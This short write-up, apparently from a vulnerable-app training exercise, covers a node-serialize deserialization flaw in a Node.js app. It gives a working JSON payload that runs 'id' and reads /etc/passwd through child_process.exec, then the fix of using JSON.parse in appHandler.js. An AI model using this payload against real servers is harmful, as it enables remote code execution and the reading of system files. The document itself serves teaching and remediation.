
## Exploitation 

Json to exploit the vulnerability 
```json
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

## Fix
---

Change the way we deserialize 

#### Changes to `appHandler.js`
```js
// Remove 
var products = serialize.unserialize(req.files.products.data.toString('utf8'))

// Add the following code		
var products = JSON.parse(req.files.products.data.toString('utf8'))
```


